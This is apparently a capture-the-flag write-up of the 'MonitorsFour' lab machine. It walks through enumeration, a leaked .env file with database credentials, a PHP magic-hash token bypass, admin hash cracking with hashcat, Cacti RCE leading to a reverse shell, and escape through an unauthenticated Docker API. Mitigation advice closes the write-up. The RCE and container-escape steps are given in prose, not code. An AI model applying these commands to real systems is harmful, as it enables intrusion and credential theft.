# **MonitorsFour — Full Penetration Test Write-Up**

A complete walkthrough of my exploitation process against the **MonitorsFour** target.  
This write-up follows the same clean, structured, documentation-forward format found across my repositories — serving as both a **technical reference** and a **professional showcase** of methodology, enumeration discipline, exploitation workflow, and post-exploitation analysis.

---

## **📡 Enumeration Phase**

Initial enumeration began with a **full TCP sweep**, mapping exposed services and collecting all actionable data for later exploitation.

### **🔍 Full Nmap Scan**

```bash
nmap -sV -sC -A -T4 -p- 10.129.44.167 -o nmap_scan.md
```

**Scan Output Highlights**

```
Host is up (0.054s latency).
Not shown: 65533 filtered tcp ports (no-response)

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/

5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)

TRACEROUTE (using port 80/tcp)
1   56.07 ms 10.10.14.1
2   56.02 ms 10.129.44.167
```

### **📝 Key Findings**

- Web server hosted on **nginx**
- Windows-based environment
- Redirect reveals virtual host: **monitorsfour.htb**
- WinRM-related service (5985) may be accessible later post-pivot
- Web entry point is likely the primary attack surface

---

## **🌐 Web Enumeration**

Once the hostnames were mapped, I performed directory enumeration against the discovered vhost.

### **📁 Directory & File Discovery**

#### **Gobuster Scan**

```bash
gobuster dir -u http://monitorsfour.htb -w /usr/share/wordlists/dirb/common.txt
```

**Discovered paths**
- /contact  
- /controllers  
- /forgot-password  
- /login  
- /static  
- /user  
- /views  

#### **Dirsearch Scan**

```bash
dirsearch -u http://monitorsfour.htb -x 404
```

**Additional high-value findings**
- /.env  
- /admin  
- /administrator  

---

## **🔐 Sensitive File Exposure — .env Leak**

`.env` revealed full database configuration:

```
DB_HOST=mariab
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsfourdbuser
DB_PASS=f37p2j8f4t0r
```

This confirmed:
- Application is backed by MariaDB
- Hardcoded credentials are present
- Likely vulnerable API endpoints exist

---

## **🌐 Subdomain Enumeration**

Next, I tested for additional services hosted under virtual subdomains.

```bash
ffuf -c -u http://monitorsfour.htb/ -H "Host:FUZZ.monitorsfour.htb" -w wordlist -fw 3
```

**Results**
- **cacti.monitorsfour.htb**

Browsing the subdomain reveals:

- **Cacti v1.2.28**

This becomes important later for exploitation.

---

## **🧪 API Behavior Testing**

Testing the `/user` endpoint:

```bash
curl http://monitorsfour.htb/user
{"error":"Missing token parameter"}

curl http://monitorsfour.htb/user?token=AAAA
{"error":"Invalid or missing token"}
```

This confirms:
1. Token is required  
2. Token must pass equality validation  

---

## **🧩 Vulnerability Discovery — PHP Type Juggling Weakness**

Because the site runs **PHP 8.3.27**, I tested for loose comparison vulnerabilities.

If the backend logic resembles:

```php
if ($user_token == $_GET['token']) { ... }
```

…then supplying a *magic hash* (`0e###`) may bypass authentication.

---

### **🔨 Attack — Magic Hash Injection**

```bash
ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w php_loose_comparison.txt -fw 4
```

One token stood out:

- **0e1234** → returned **valid**

Confirming:

- Backend uses **loose comparison (`==`)**
- Auth can be bypassed trivially

---

### **📥 Extracting Admin Credentials**

```bash
curl -i "http://monitorsfour.htb/user?token=0e1234" | jq .
```

Output:

```json
{
  "username": "admin",
  "email": "admin@monitorsfour.htb",
  "password": "5**************",
  "role": "super user",
  "token": "8*****************",
  "name": "Marcus Higgins"
}
```

The password is MD5-hashed.

---

## **🔓 Cracking the Admin Hash**

I dumped the hash into hashcat:

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Result:
- **Password recovered**
- Login usable on **cacti.monitorsfour.htb**

This validates the foothold vector.

---

## **🚀 Exploitation — Cacti (CVE-2025-24367)**

The detected Cacti version (**1.2.28**) is affected by **CVE-2025-24367**, enabling:

- Authenticated remote code execution
- Arbitrary command injection via crafted requests

Using a custom script or a public PoC:

- I achieved RCE
- Triggered a reverse shell
- Gained access as **www-data / cacti process**

---

## **🏁 Foothold -> User**

Once inside, I enumerated user accounts and located:

- `/home/marcus/user.txt`

Retrieved successfully.

---

## **⛓️ Lateral Movement — Docker Desktop / WSL2**

While enumerating the environment, I discovered bridged interfaces:

- 172.18.0.3  
- 172.18.0.2  
- 192.168.65.7  

Using **fscan**, I enumerated the host:

```bash
fscan -h 192.168.65.7
```

**Findings**

- **Port 2375/tcp** open  
- Docker daemon exposed **without authentication**

A major privilege boundary bypass.

---

## **🔥 Privilege Escalation — Docker API RCE (CVE-2025-9074)**

Using the Docker Daemon API:

```bash
curl -s http://192.168.65.7:2375/images/json
```

Confirms the daemon is fully exposed.

Using either:
- A PoC for **CVE-2025-9074**, or
- Manually crafting container deployments

…it’s possible to escape to the host, achieving full administrative control.

---

## **🏆 Final Access**

From this point:

- Full system compromise achieved
- root/admin privileges obtained
- All flags collected

---

## **🔒 Mitigation Recommendations**

- Remove exposed Docker daemon (2375)
- Enforce TLS on the Docker API
- Patch Cacti to latest version
- Remove `.env` exposure
- Avoid weak PHP comparison operators
- Improve vhost segmentation
- Rotate database credentials immediately

---

## **📬 Final Notes**

This write-up mirrors my repository style:
- Clean formatting  
- Clear technical workflow  
- Reproducible commands  
- Professional documentation layout  

Designed for recruiters, collaborators, and penetration testers who want to understand not just *what* I did — but *how I think*.

